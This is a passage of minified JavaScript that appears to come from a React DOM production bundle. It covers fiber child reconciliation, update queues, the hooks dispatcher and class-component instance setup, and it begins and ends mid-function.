      m) : (m = s(m, p.children || []),
        m.return = g,
        m)
  }
  function d(g, m, p, w, S) {
    return m === null || m.tag !== 7 ? (m = Qr(p, g.mode, w, S),
      m.return = g,
      m) : (m = s(m, p),
        m.return = g,
        m)
  }
  function f(g, m, p) {
    if (typeof m == "string" && m !== "" || typeof m == "number")
      return m = Uc("" + m, g.mode, p),
        m.return = g,
        m;
    if (typeof m == "object" && m !== null) {
      switch (m.$$typeof) {
        case Xi:
          return p = Ra(m.type, m.key, m.props, null, g.mode, p),
            p.ref = No(g, null, m),
            p.return = g,
            p;
        case ds:
          return m = $c(m, g.mode, p),
            m.return = g,
            m;
        case Jn:
          var w = m._init;
          return f(g, w(m._payload), p)
      }
      if (Oo(m) || xo(m))
        return m = Qr(m, g.mode, p, null),
          m.return = g,
          m;
      la(g, m)
    }
    return null
  }
  function h(g, m, p, w) {
    var S = m !== null ? m.key : null;
    if (typeof p == "string" && p !== "" || typeof p == "number")
      return S !== null ? null : l(g, m, "" + p, w);
    if (typeof p == "object" && p !== null) {
      switch (p.$$typeof) {
        case Xi:
          return p.key === S ? c(g, m, p, w) : null;
        case ds:
          return p.key === S ? u(g, m, p, w) : null;
        case Jn:
          return S = p._init,
            h(g, m, S(p._payload), w)
      }
      if (Oo(p) || xo(p))
        return S !== null ? null : d(g, m, p, w, null);
      la(g, p)
    }
    return null
  }
  function y(g, m, p, w, S) {
    if (typeof w == "string" && w !== "" || typeof w == "number")
      return g = g.get(p) || null,
        l(m, g, "" + w, S);
    if (typeof w == "object" && w !== null) {
      switch (w.$$typeof) {
        case Xi:
          return g = g.get(w.key === null ? p : w.key) || null,
            c(m, g, w, S);
        case ds:
          return g = g.get(w.key === null ? p : w.key) || null,
            u(m, g, w, S);
        case Jn:
          var N = w._init;
          return y(g, m, p, N(w._payload), S)
      }
      if (Oo(w) || xo(w))
        return g = g.get(p) || null,
          d(m, g, w, S, null);
      la(m, w)
    }
    return null
  }
  function b(g, m, p, w) {
    for (var S = null, N = null, P = m, A = m = 0, k = null; P !== null && A < p.length; A++) {
      P.index > A ? (k = P,
        P = null) : k = P.sibling;
      var D = h(g, P, p[A], w);
      if (D === null) {
        P === null && (P = k);
        break
      }
      e && P && D.alternate === null && t(g, P),
        m = o(D, m, A),
        N === null ? S = D : N.sibling = D,
        N = D,
        P = k
    }
    if (A === p.length)
      return n(g, P),
        ve && Dr(g, A),
        S;
    if (P === null) {
      for (; A < p.length; A++)
        P = f(g, p[A], w),
          P !== null && (m = o(P, m, A),
            N === null ? S = P : N.sibling = P,
            N = P);
      return ve && Dr(g, A),
        S
    }
    for (P = r(g, P); A < p.length; A++)
      k = y(P, g, A, p[A], w),
        k !== null && (e && k.alternate !== null && P.delete(k.key === null ? A : k.key),
          m = o(k, m, A),
          N === null ? S = k : N.sibling = k,
          N = k);
    return e && P.forEach(function (q) {
      return t(g, q)
    }),
      ve && Dr(g, A),
      S
  }
  function v(g, m, p, w) {
    var S = xo(p);
    if (typeof S != "function")
      throw Error(F(150));
    if (p = S.call(p),
      p == null)
      throw Error(F(151));
    for (var N = S = null, P = m, A = m = 0, k = null, D = p.next(); P !== null && !D.done; A++,
      D = p.next()) {
      P.index > A ? (k = P,
        P = null) : k = P.sibling;
      var q = h(g, P, D.value, w);
      if (q === null) {
        P === null && (P = k);
        break
      }
      e && P && q.alternate === null && t(g, P),
        m = o(q, m, A),
        N === null ? S = q : N.sibling = q,
        N = q,
        P = k
    }
    if (D.done)
      return n(g, P),
        ve && Dr(g, A),
        S;
    if (P === null) {
      for (; !D.done; A++,
        D = p.next())
        D = f(g, D.value, w),
          D !== null && (m = o(D, m, A),
            N === null ? S = D : N.sibling = D,
            N = D);
      return ve && Dr(g, A),
        S
    }
    for (P = r(g, P); !D.done; A++,
      D = p.next())
      D = y(P, g, A, D.value, w),
        D !== null && (e && D.alternate !== null && P.delete(D.key === null ? A : D.key),
          m = o(D, m, A),
          N === null ? S = D : N.sibling = D,
          N = D);
    return e && P.forEach(function (I) {
      return t(g, I)
    }),
      ve && Dr(g, A),
      S
  }
  function C(g, m, p, w) {
    if (typeof p == "object" && p !== null && p.type === fs && p.key === null && (p = p.props.children),
      typeof p == "object" && p !== null) {
      switch (p.$$typeof) {
        case Xi:
          e: {
            for (var S = p.key, N = m; N !== null;) {
              if (N.key === S) {
                if (S = p.type,
                  S === fs) {
                  if (N.tag === 7) {
                    n(g, N.sibling),
                      m = s(N, p.props.children),
                      m.return = g,
                      g = m;
                    break e
                  }
                } else if (N.elementType === S || typeof S == "object" && S !== null && S.$$typeof === Jn && Sm(S) === N.type) {
                  n(g, N.sibling),
                    m = s(N, p.props),
                    m.ref = No(g, N, p),
                    m.return = g,
                    g = m;
                  break e
                }
                n(g, N);
                break
              } else
                t(g, N);
              N = N.sibling
            }
            p.type === fs ? (m = Qr(p.props.children, g.mode, w, p.key),
              m.return = g,
              g = m) : (w = Ra(p.type, p.key, p.props, null, g.mode, w),
                w.ref = No(g, m, p),
                w.return = g,
                g = w)
          }
          return i(g);
        case ds:
          e: {
            for (N = p.key; m !== null;) {
              if (m.key === N)
                if (m.tag === 4 && m.stateNode.containerInfo === p.containerInfo && m.stateNode.implementation === p.implementation) {
                  n(g, m.sibling),
                    m = s(m, p.children || []),
                    m.return = g,
                    g = m;
                  break e
                } else {
                  n(g, m);
                  break
                }
              else
                t(g, m);
              m = m.sibling
            }
            m = $c(p, g.mode, w),
              m.return = g,
              g = m
          }
          return i(g);
        case Jn:
          return N = p._init,
            C(g, m, N(p._payload), w)
      }
      if (Oo(p))
        return b(g, m, p, w);
      if (xo(p))
        return v(g, m, p, w);
      la(g, p)
    }
    return typeof p == "string" && p !== "" || typeof p == "number" ? (p = "" + p,
      m !== null && m.tag === 6 ? (n(g, m.sibling),
        m = s(m, p),
        m.return = g,
        g = m) : (n(g, m),
          m = Uc(p, g.mode, w),
          m.return = g,
          g = m),
      i(g)) : n(g, m)
  }
  return C
}
var Gs = Py(!0)
  , Ay = Py(!1)
  , el = Pr(null)
  , tl = null
  , ws = null
  , df = null;
function ff() {
  df = ws = tl = null
}
function hf(e) {
  var t = el.current;
  ye(el),
    e._currentValue = t
}
function Ku(e, t, n) {
  for (; e !== null;) {
    var r = e.alternate;
    if ((e.childLanes & t) !== t ? (e.childLanes |= t,
      r !== null && (r.childLanes |= t)) : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t),
      e === n)
      break;
    e = e.return
  }
}
function Ms(e, t) {
  tl = e,
    df = ws = null,
    e = e.dependencies,
    e !== null && e.firstContext !== null && (e.lanes & t && (ut = !0),
      e.firstContext = null)
}
function Vt(e) {
  var t = e._currentValue;
  if (df !== e)
    if (e = {
      context: e,
      memoizedValue: t,
      next: null
    },
      ws === null) {
      if (tl === null)
        throw Error(F(308));
      ws = e,
        tl.dependencies = {
          lanes: 0,
          firstContext: e
        }
    } else
      ws = ws.next = e;
  return t
}
var Lr = null;
function mf(e) {
  Lr === null ? Lr = [e] : Lr.push(e)
}
function Ey(e, t, n, r) {
  var s = t.interleaved;
  return s === null ? (n.next = n,
    mf(t)) : (n.next = s.next,
      s.next = n),
    t.interleaved = n,
    Ln(e, r)
}
function Ln(e, t) {
  e.lanes |= t;
  var n = e.alternate;
  for (n !== null && (n.lanes |= t),
    n = e,
    e = e.return; e !== null;)
    e.childLanes |= t,
      n = e.alternate,
      n !== null && (n.childLanes |= t),
      n = e,
      e = e.return;
  return n.tag === 3 ? n.stateNode : null
}
var Zn = !1;
function pf(e) {
  e.updateQueue = {
    baseState: e.memoizedState,
    firstBaseUpdate: null,
    lastBaseUpdate: null,
    shared: {
      pending: null,
      interleaved: null,
      lanes: 0
    },
    effects: null
  }
}
function Ty(e, t) {
  e = e.updateQueue,
    t.updateQueue === e && (t.updateQueue = {
      baseState: e.baseState,
      firstBaseUpdate: e.firstBaseUpdate,
      lastBaseUpdate: e.lastBaseUpdate,
      shared: e.shared,
      effects: e.effects
    })
}
function Dn(e, t) {
  return {
    eventTime: e,
    lane: t,
    tag: 0,
    payload: null,
    callback: null,
    next: null
  }
}
function pr(e, t, n) {
  var r = e.updateQueue;
  if (r === null)
    return null;
  if (r = r.shared,
    ie & 2) {
    var s = r.pending;
    return s === null ? t.next = t : (t.next = s.next,
      s.next = t),
      r.pending = t,
      Ln(e, n)
  }
  return s = r.interleaved,
    s === null ? (t.next = t,
      mf(r)) : (t.next = s.next,
        s.next = t),
    r.interleaved = t,
    Ln(e, n)
}
function Aa(e, t, n) {
  if (t = t.updateQueue,
    t !== null && (t = t.shared,
      (n & 4194240) !== 0)) {
    var r = t.lanes;
    r &= e.pendingLanes,
      n |= r,
      t.lanes = n,
      Zd(e, n)
  }
}
function Cm(e, t) {
  var n = e.updateQueue
    , r = e.alternate;
  if (r !== null && (r = r.updateQueue,
    n === r)) {
    var s = null
      , o = null;
    if (n = n.firstBaseUpdate,
      n !== null) {
      do {
        var i = {
          eventTime: n.eventTime,
          lane: n.lane,
          tag: n.tag,
          payload: n.payload,
          callback: n.callback,
          next: null
        };
        o === null ? s = o = i : o = o.next = i,
          n = n.next
      } while (n !== null);
      o === null ? s = o = t : o = o.next = t
    } else
      s = o = t;
    n = {
      baseState: r.baseState,
      firstBaseUpdate: s,
      lastBaseUpdate: o,
      shared: r.shared,
      effects: r.effects
    },
      e.updateQueue = n;
    return
  }
  e = n.lastBaseUpdate,
    e === null ? n.firstBaseUpdate = t : e.next = t,
    n.lastBaseUpdate = t
}
function nl(e, t, n, r) {
  var s = e.updateQueue;
  Zn = !1;
  var o = s.firstBaseUpdate
    , i = s.lastBaseUpdate
    , l = s.shared.pending;
  if (l !== null) {
    s.shared.pending = null;
    var c = l
      , u = c.next;
    c.next = null,
      i === null ? o = u : i.next = u,
      i = c;
    var d = e.alternate;
    d !== null && (d = d.updateQueue,
      l = d.lastBaseUpdate,
      l !== i && (l === null ? d.firstBaseUpdate = u : l.next = u,
        d.lastBaseUpdate = c))
  }
  if (o !== null) {
    var f = s.baseState;
    i = 0,
      d = u = c = null,
      l = o;
    do {
      var h = l.lane
        , y = l.eventTime;
      if ((r & h) === h) {
        d !== null && (d = d.next = {
          eventTime: y,
          lane: 0,
          tag: l.tag,
          payload: l.payload,
          callback: l.callback,
          next: null
        });
        e: {
          var b = e
            , v = l;
          switch (h = t,
          y = n,
          v.tag) {
            case 1:
              if (b = v.payload,
                typeof b == "function") {
                f = b.call(y, f, h);
                break e
              }
              f = b;
              break e;
            case 3:
              b.flags = b.flags & -65537 | 128;
            case 0:
              if (b = v.payload,
                h = typeof b == "function" ? b.call(y, f, h) : b,
                h == null)
                break e;
              f = Se({}, f, h);
              break e;
            case 2:
              Zn = !0
          }
        }
        l.callback !== null && l.lane !== 0 && (e.flags |= 64,
          h = s.effects,
          h === null ? s.effects = [l] : h.push(l))
      } else
        y = {
          eventTime: y,
          lane: h,
          tag: l.tag,
          payload: l.payload,
          callback: l.callback,
          next: null
        },
          d === null ? (u = d = y,
            c = f) : d = d.next = y,
          i |= h;
      if (l = l.next,
        l === null) {
        if (l = s.shared.pending,
          l === null)
          break;
        h = l,
          l = h.next,
          h.next = null,
          s.lastBaseUpdate = h,
          s.shared.pending = null
      }
    } while (!0);
    if (d === null && (c = f),
      s.baseState = c,
      s.firstBaseUpdate = u,
      s.lastBaseUpdate = d,
      t = s.shared.interleaved,
      t !== null) {
      s = t;
      do
        i |= s.lane,
          s = s.next;
      while (s !== t)
    } else
      o === null && (s.shared.lanes = 0);
    Xr |= i,
      e.lanes = i,
      e.memoizedState = f
  }
}
function Nm(e, t, n) {
  if (e = t.effects,
    t.effects = null,
    e !== null)
    for (t = 0; t < e.length; t++) {
      var r = e[t]
        , s = r.callback;
      if (s !== null) {
        if (r.callback = null,
          r = n,
          typeof s != "function")
          throw Error(F(191, s));
        s.call(r)
      }
    }
}
var Oi = {}
  , mn = Pr(Oi)
  , di = Pr(Oi)
  , fi = Pr(Oi);
function Fr(e) {
  if (e === Oi)
    throw Error(F(174));
  return e
}
function gf(e, t) {
  switch (fe(fi, t),
  fe(di, e),
  fe(mn, Oi),
  e = t.nodeType,
  e) {
    case 9:
    case 11:
      t = (t = t.documentElement) ? t.namespaceURI : Tu(null, "");
      break;
    default:
      e = e === 8 ? t.parentNode : t,
        t = e.namespaceURI || null,
        e = e.tagName,
        t = Tu(t, e)
  }
  ye(mn),
    fe(mn, t)
}
function Ks() {
  ye(mn),
    ye(di),
    ye(fi)
}
function ky(e) {
  Fr(fi.current);
  var t = Fr(mn.current)
    , n = Tu(t, e.type);
  t !== n && (fe(di, e),
    fe(mn, n))
}
function yf(e) {
  di.current === e && (ye(mn),
    ye(di))
}
var xe = Pr(0);
function rl(e) {
  for (var t = e; t !== null;) {
    if (t.tag === 13) {
      var n = t.memoizedState;
      if (n !== null && (n = n.dehydrated,
        n === null || n.data === "$?" || n.data === "$!"))
        return t
    } else if (t.tag === 19 && t.memoizedProps.revealOrder !== void 0) {
      if (t.flags & 128)
        return t
    } else if (t.child !== null) {
      t.child.return = t,
        t = t.child;
      continue
    }
    if (t === e)
      break;
    for (; t.sibling === null;) {
      if (t.return === null || t.return === e)
        return null;
      t = t.return
    }
    t.sibling.return = t.return,
      t = t.sibling
  }
  return null
}
var _c = [];
function vf() {
  for (var e = 0; e < _c.length; e++)
    _c[e]._workInProgressVersionPrimary = null;
  _c.length = 0
}
var Ea = zn.ReactCurrentDispatcher
  , Lc = zn.ReactCurrentBatchConfig
  , Yr = 0
  , be = null
  , Oe = null
  , _e = null
  , sl = !1
  , Ho = !1
  , hi = 0
  , K2 = 0;
function Qe() {
  throw Error(F(321))
}
function xf(e, t) {
  if (t === null)
    return !1;
  for (var n = 0; n < t.length && n < e.length; n++)
    if (!en(e[n], t[n]))
      return !1;
  return !0
}
function wf(e, t, n, r, s, o) {
  if (Yr = o,
    be = t,
    t.memoizedState = null,
    t.updateQueue = null,
    t.lanes = 0,
    Ea.current = e === null || e.memoizedState === null ? Z2 : eS,
    e = n(r, s),
    Ho) {
    o = 0;
    do {
      if (Ho = !1,
        hi = 0,
        25 <= o)
        throw Error(F(301));
      o += 1,
        _e = Oe = null,
        t.updateQueue = null,
        Ea.current = tS,
        e = n(r, s)
    } while (Ho)
  }
  if (Ea.current = ol,
    t = Oe !== null && Oe.next !== null,
    Yr = 0,
    _e = Oe = be = null,
    sl = !1,
    t)
    throw Error(F(300));
  return e
}
function bf() {
  var e = hi !== 0;
  return hi = 0,
    e
}
function rn() {
  var e = {
    memoizedState: null,
    baseState: null,
    baseQueue: null,
    queue: null,
    next: null
  };
  return _e === null ? be.memoizedState = _e = e : _e = _e.next = e,
    _e
}
function Bt() {
  if (Oe === null) {
    var e = be.alternate;
    e = e !== null ? e.memoizedState : null
  } else
    e = Oe.next;
  var t = _e === null ? be.memoizedState : _e.next;
  if (t !== null)
    _e = t,
      Oe = e;
  else {
    if (e === null)
      throw Error(F(310));
    Oe = e,
      e = {
        memoizedState: Oe.memoizedState,
        baseState: Oe.baseState,
        baseQueue: Oe.baseQueue,
        queue: Oe.queue,
        next: null
      },
      _e === null ? be.memoizedState = _e = e : _e = _e.next = e
  }
  return _e
}
function mi(e, t) {
  return typeof t == "function" ? t(e) : t
}
function Fc(e) {
  var t = Bt()
    , n = t.queue;
  if (n === null)
    throw Error(F(311));
  n.lastRenderedReducer = e;
  var r = Oe
    , s = r.baseQueue
    , o = n.pending;
  if (o !== null) {
    if (s !== null) {
      var i = s.next;
      s.next = o.next,
        o.next = i
    }
    r.baseQueue = s = o,
      n.pending = null
  }
  if (s !== null) {
    o = s.next,
      r = r.baseState;
    var l = i = null
      , c = null
      , u = o;
    do {
      var d = u.lane;
      if ((Yr & d) === d)
        c !== null && (c = c.next = {
          lane: 0,
          action: u.action,
          hasEagerState: u.hasEagerState,
          eagerState: u.eagerState,
          next: null
        }),
          r = u.hasEagerState ? u.eagerState : e(r, u.action);
      else {
        var f = {
          lane: d,
          action: u.action,
          hasEagerState: u.hasEagerState,
          eagerState: u.eagerState,
          next: null
        };
        c === null ? (l = c = f,
          i = r) : c = c.next = f,
          be.lanes |= d,
          Xr |= d
      }
      u = u.next
    } while (u !== null && u !== o);
    c === null ? i = r : c.next = l,
      en(r, t.memoizedState) || (ut = !0),
      t.memoizedState = r,
      t.baseState = i,
      t.baseQueue = c,
      n.lastRenderedState = r
  }
  if (e = n.interleaved,
    e !== null) {
    s = e;
    do
      o = s.lane,
        be.lanes |= o,
        Xr |= o,
        s = s.next;
    while (s !== e)
  } else
    s === null && (n.lanes = 0);
  return [t.memoizedState, n.dispatch]
}
function Vc(e) {
  var t = Bt()
    , n = t.queue;
  if (n === null)
    throw Error(F(311));
  n.lastRenderedReducer = e;
  var r = n.dispatch
    , s = n.pending
    , o = t.memoizedState;
  if (s !== null) {
    n.pending = null;
    var i = s = s.next;
    do
      o = e(o, i.action),
        i = i.next;
    while (i !== s);
    en(o, t.memoizedState) || (ut = !0),
      t.memoizedState = o,
      t.baseQueue === null && (t.baseState = o),
      n.lastRenderedState = o
  }
  return [o, r]
}
function Dy() { }
function My(e, t) {
  var n = be
    , r = Bt()
    , s = t()
    , o = !en(r.memoizedState, s);
  if (o && (r.memoizedState = s,
    ut = !0),
    r = r.queue,
    Sf(Iy.bind(null, n, r, e), [e]),
    r.getSnapshot !== t || o || _e !== null && _e.memoizedState.tag & 1) {
    if (n.flags |= 2048,
      pi(9, Oy.bind(null, n, r, s, t), void 0, null),
      Le === null)
      throw Error(F(349));
    Yr & 30 || Ry(n, t, s)
  }
  return s
}
function Ry(e, t, n) {
  e.flags |= 16384,
    e = {
      getSnapshot: t,
      value: n
    },
    t = be.updateQueue,
    t === null ? (t = {
      lastEffect: null,
      stores: null
    },
      be.updateQueue = t,
      t.stores = [e]) : (n = t.stores,
        n === null ? t.stores = [e] : n.push(e))
}
function Oy(e, t, n, r) {
  t.value = n,
    t.getSnapshot = r,
    _y(t) && Ly(e)
}
function Iy(e, t, n) {
  return n(function () {
    _y(t) && Ly(e)
  })
}
function _y(e) {
  var t = e.getSnapshot;
  e = e.value;
  try {
    var n = t();
    return !en(e, n)
  } catch {
    return !0
  }
}
function Ly(e) {
  var t = Ln(e, 1);
  t !== null && Zt(t, e, 1, -1)
}
function jm(e) {
  var t = rn();
  return typeof e == "function" && (e = e()),
    t.memoizedState = t.baseState = e,
    e = {
      pending: null,
      interleaved: null,
      lanes: 0,
      dispatch: null,
      lastRenderedReducer: mi,
      lastRenderedState: e
    },
    t.queue = e,
    e = e.dispatch = J2.bind(null, be, e),
    [t.memoizedState, e]
}
function pi(e, t, n, r) {
  return e = {
    tag: e,
    create: t,
    destroy: n,
    deps: r,
    next: null
  },
    t = be.updateQueue,
    t === null ? (t = {
      lastEffect: null,
      stores: null
    },
      be.updateQueue = t,
      t.lastEffect = e.next = e) : (n = t.lastEffect,
        n === null ? t.lastEffect = e.next = e : (r = n.next,
          n.next = e,
          e.next = r,
          t.lastEffect = e)),
    e
}
function Fy() {
  return Bt().memoizedState
}
function Ta(e, t, n, r) {
  var s = rn();
  be.flags |= e,
    s.memoizedState = pi(1 | t, n, void 0, r === void 0 ? null : r)
}
function Il(e, t, n, r) {
  var s = Bt();
  r = r === void 0 ? null : r;
  var o = void 0;
  if (Oe !== null) {
    var i = Oe.memoizedState;
    if (o = i.destroy,
      r !== null && xf(r, i.deps)) {
      s.memoizedState = pi(t, n, o, r);
      return
    }
  }
  be.flags |= e,
    s.memoizedState = pi(1 | t, n, o, r)
}
function Pm(e, t) {
  return Ta(8390656, 8, e, t)
}
function Sf(e, t) {
  return Il(2048, 8, e, t)
}
function Vy(e, t) {
  return Il(4, 2, e, t)
}
function By(e, t) {
  return Il(4, 4, e, t)
}
function zy(e, t) {
  if (typeof t == "function")
    return e = e(),
      t(e),
      function () {
        t(null)
      }
      ;
  if (t != null)
    return e = e(),
      t.current = e,
      function () {
        t.current = null
      }
}
function Uy(e, t, n) {
  return n = n != null ? n.concat([e]) : null,
    Il(4, 4, zy.bind(null, t, e), n)
}
function Cf() { }
function $y(e, t) {
  var n = Bt();
  t = t === void 0 ? null : t;
  var r = n.memoizedState;
  return r !== null && t !== null && xf(t, r[1]) ? r[0] : (n.memoizedState = [e, t],
    e)
}
function Hy(e, t) {
  var n = Bt();
  t = t === void 0 ? null : t;
  var r = n.memoizedState;
  return r !== null && t !== null && xf(t, r[1]) ? r[0] : (e = e(),
    n.memoizedState = [e, t],
    e)
}
function Wy(e, t, n) {
  return Yr & 21 ? (en(n, t) || (n = Y0(),
    be.lanes |= n,
    Xr |= n,
    e.baseState = !0),
    t) : (e.baseState && (e.baseState = !1,
      ut = !0),
      e.memoizedState = n)
}
function Y2(e, t) {
  var n = ce;
  ce = n !== 0 && 4 > n ? n : 4,
    e(!0);
  var r = Lc.transition;
  Lc.transition = {};
  try {
    e(!1),
      t()
  } finally {
    ce = n,
      Lc.transition = r
  }
}
function Qy() {
  return Bt().memoizedState
}
function X2(e, t, n) {
  var r = yr(e);
  if (n = {
    lane: r,
    action: n,
    hasEagerState: !1,
    eagerState: null,
    next: null
  },
    qy(e))
    Gy(t, n);
  else if (n = Ey(e, t, n, r),
    n !== null) {
    var s = ot();
    Zt(n, e, r, s),
      Ky(n, t, r)
  }
}
function J2(e, t, n) {
  var r = yr(e)
    , s = {
      lane: r,
      action: n,
      hasEagerState: !1,
      eagerState: null,
      next: null
    };
  if (qy(e))
    Gy(t, s);
  else {
    var o = e.alternate;
    if (e.lanes === 0 && (o === null || o.lanes === 0) && (o = t.lastRenderedReducer,
      o !== null))
      try {
        var i = t.lastRenderedState
          , l = o(i, n);
        if (s.hasEagerState = !0,
          s.eagerState = l,
          en(l, i)) {
          var c = t.interleaved;
          c === null ? (s.next = s,
            mf(t)) : (s.next = c.next,
              c.next = s),
            t.interleaved = s;
          return
        }
      } catch { } finally { }
    n = Ey(e, t, s, r),
      n !== null && (s = ot(),
        Zt(n, e, r, s),
        Ky(n, t, r))
  }
}
function qy(e) {
  var t = e.alternate;
  return e === be || t !== null && t === be
}
function Gy(e, t) {
  Ho = sl = !0;
  var n = e.pending;
  n === null ? t.next = t : (t.next = n.next,
    n.next = t),
    e.pending = t
}
function Ky(e, t, n) {
  if (n & 4194240) {
    var r = t.lanes;
    r &= e.pendingLanes,
      n |= r,
      t.lanes = n,
      Zd(e, n)
  }
}
var ol = {
  readContext: Vt,
  useCallback: Qe,
  useContext: Qe,
  useEffect: Qe,
  useImperativeHandle: Qe,
  useInsertionEffect: Qe,
  useLayoutEffect: Qe,
  useMemo: Qe,
  useReducer: Qe,
  useRef: Qe,
  useState: Qe,
  useDebugValue: Qe,
  useDeferredValue: Qe,
  useTransition: Qe,
  useMutableSource: Qe,
  useSyncExternalStore: Qe,
  useId: Qe,
  unstable_isNewReconciler: !1
}
  , Z2 = {
    readContext: Vt,
    useCallback: function (e, t) {
      return rn().memoizedState = [e, t === void 0 ? null : t],
        e
    },
    useContext: Vt,
    useEffect: Pm,
    useImperativeHandle: function (e, t, n) {
      return n = n != null ? n.concat([e]) : null,
        Ta(4194308, 4, zy.bind(null, t, e), n)
    },
    useLayoutEffect: function (e, t) {
      return Ta(4194308, 4, e, t)
    },
    useInsertionEffect: function (e, t) {
      return Ta(4, 2, e, t)
    },
    useMemo: function (e, t) {
      var n = rn();
      return t = t === void 0 ? null : t,
        e = e(),
        n.memoizedState = [e, t],
        e
    },
    useReducer: function (e, t, n) {
      var r = rn();
      return t = n !== void 0 ? n(t) : t,
        r.memoizedState = r.baseState = t,
        e = {
          pending: null,
          interleaved: null,
          lanes: 0,
          dispatch: null,
          lastRenderedReducer: e,
          lastRenderedState: t
        },
        r.queue = e,
        e = e.dispatch = X2.bind(null, be, e),
        [r.memoizedState, e]
    },
    useRef: function (e) {
      var t = rn();
      return e = {
        current: e
      },
        t.memoizedState = e
    },
    useState: jm,
    useDebugValue: Cf,
    useDeferredValue: function (e) {
      return rn().memoizedState = e
    },
    useTransition: function () {
      var e = jm(!1)
        , t = e[0];
      return e = Y2.bind(null, e[1]),
        rn().memoizedState = e,
        [t, e]
    },
    useMutableSource: function () { },
    useSyncExternalStore: function (e, t, n) {
      var r = be
        , s = rn();
      if (ve) {
        if (n === void 0)
          throw Error(F(407));
        n = n()
      } else {
        if (n = t(),
          Le === null)
          throw Error(F(349));
        Yr & 30 || Ry(r, t, n)
      }
      s.memoizedState = n;
      var o = {
        value: n,
        getSnapshot: t
      };
      return s.queue = o,
        Pm(Iy.bind(null, r, o, e), [e]),
        r.flags |= 2048,
        pi(9, Oy.bind(null, r, o, n, t), void 0, null),
        n
    },
    useId: function () {
      var e = rn()
        , t = Le.identifierPrefix;
      if (ve) {
        var n = Pn
          , r = jn;
        n = (r & ~(1 << 32 - Jt(r) - 1)).toString(32) + n,
          t = ":" + t + "R" + n,
          n = hi++,
          0 < n && (t += "H" + n.toString(32)),
          t += ":"
      } else
        n = K2++,
          t = ":" + t + "r" + n.toString(32) + ":";
      return e.memoizedState = t
    },
    unstable_isNewReconciler: !1
  }
  , eS = {
    readContext: Vt,
    useCallback: $y,
    useContext: Vt,
    useEffect: Sf,
    useImperativeHandle: Uy,
    useInsertionEffect: Vy,
    useLayoutEffect: By,
    useMemo: Hy,
    useReducer: Fc,
    useRef: Fy,
    useState: function () {
      return Fc(mi)
    },
    useDebugValue: Cf,
    useDeferredValue: function (e) {
      var t = Bt();
      return Wy(t, Oe.memoizedState, e)
    },
    useTransition: function () {
      var e = Fc(mi)[0]
        , t = Bt().memoizedState;
      return [e, t]
    },
    useMutableSource: Dy,
    useSyncExternalStore: My,
    useId: Qy,
    unstable_isNewReconciler: !1
  }
  , tS = {
    readContext: Vt,
    useCallback: $y,
    useContext: Vt,
    useEffect: Sf,
    useImperativeHandle: Uy,
    useInsertionEffect: Vy,
    useLayoutEffect: By,
    useMemo: Hy,
    useReducer: Vc,
    useRef: Fy,
    useState: function () {
      return Vc(mi)
    },
    useDebugValue: Cf,
    useDeferredValue: function (e) {
      var t = Bt();
      return Oe === null ? t.memoizedState = e : Wy(t, Oe.memoizedState, e)
    },
    useTransition: function () {
      var e = Vc(mi)[0]
        , t = Bt().memoizedState;
      return [e, t]
    },
    useMutableSource: Dy,
    useSyncExternalStore: My,
    useId: Qy,
    unstable_isNewReconciler: !1
  };
function Qt(e, t) {
  if (e && e.defaultProps) {
    t = Se({}, t),
      e = e.defaultProps;
    for (var n in e)
      t[n] === void 0 && (t[n] = e[n]);
    return t
  }
  return t
}
function Yu(e, t, n, r) {
  t = e.memoizedState,
    n = n(r, t),
    n = n == null ? t : Se({}, t, n),
    e.memoizedState = n,
    e.lanes === 0 && (e.updateQueue.baseState = n)
}
var _l = {
  isMounted: function (e) {
    return (e = e._reactInternals) ? ns(e) === e : !1
  },
  enqueueSetState: function (e, t, n) {
    e = e._reactInternals;
    var r = ot()
      , s = yr(e)
      , o = Dn(r, s);
    o.payload = t,
      n != null && (o.callback = n),
      t = pr(e, o, s),
      t !== null && (Zt(t, e, s, r),
        Aa(t, e, s))
  },
  enqueueReplaceState: function (e, t, n) {
    e = e._reactInternals;
    var r = ot()
      , s = yr(e)
      , o = Dn(r, s);
    o.tag = 1,
      o.payload = t,
      n != null && (o.callback = n),
      t = pr(e, o, s),
      t !== null && (Zt(t, e, s, r),
        Aa(t, e, s))
  },
  enqueueForceUpdate: function (e, t) {
    e = e._reactInternals;
    var n = ot()
      , r = yr(e)
      , s = Dn(n, r);
    s.tag = 2,
      t != null && (s.callback = t),
      t = pr(e, s, r),
      t !== null && (Zt(t, e, r, n),
        Aa(t, e, r))
  }
};
function Am(e, t, n, r, s, o, i) {
  return e = e.stateNode,
    typeof e.shouldComponentUpdate == "function" ? e.shouldComponentUpdate(r, o, i) : t.prototype && t.prototype.isPureReactComponent ? !ai(n, r) || !ai(s, o) : !0
}
function Yy(e, t, n) {
  var r = !1
    , s = Sr
    , o = t.contextType;
  return typeof o == "object" && o !== null ? o = Vt(o) : (s = ht(t) ? Gr : Ze.current,
    r = t.contextTypes,
    o = (r = r != null) ? Qs(e, s) : Sr),
    t = new t(n, o),
    e.memoizedState = t.state !== null && t.state !== void 0 ? t.state : null,
    t.updater = _l,
    e.stateNode = t,
    t._reactInternals = e,
    r && (e = e.stateNode,
      e.__reactInternalMemoizedUnmaskedChildContext = s,
      e.__reactInternalMemoizedMaskedChildContext = o),
    t
}
function Em(e, t, n, r) {
  e = t.state,
    typeof t.componentWillReceiveProps == "function" && t.componentWillReceiveProps(n, r),
    typeof t.UNSAFE_componentWillReceiveProps == "function" && t.UNSAFE_componentWillReceiveProps(n, r),
    t.state !== e && _l.enqueueReplaceState(t, t.state, null)
}
function Xu(e, t, n, r) {
  var s = e.stateNode;
  s.props = n,
    s.state = e.memoizedState,
    s.refs = {},
    pf(e);
  var o = t.contextType;
  typeof o == "object" && o !== null ? s.context = Vt(o) : (o = ht(t) ? Gr : Ze.current,
    s.context = Qs(e, o)),
    s.state = e.memoizedState,
    o = t.getDerivedStateFromProps,
    typeof o == "function" && (Yu(e, t, o, n),
      s.state = e.memoizedState),
    typeof t.getDerivedStateFromProps == "function" || typeof s.getSnapshotBeforeUpdate == "function" || typeof s.UNSAFE_componentWillMount != "function" && typeof s.componentWillMount != "function" || (t = s.state,
      typeof s.componentWillMount == "function" && s.componentWillMount(),
      typeof s.UNSAFE_componentWillMount == "function" && s.UNSAFE_componentWillMount(),
      t !== s.state && _l.enqueueReplaceState(s, s.state, null),
      nl(e, n, s, r),
      s.state = e.memoizedState),
    typeof s.componentDidMount == "function" && (e.flags |= 4194308)
}
function Ys(e, t) {
  try {
    var n = ""
      , r = t;
    do
      n += Tb(r),
        r = r.return;
    while (r);
    var s = n
  } catch (o) {
    s = `
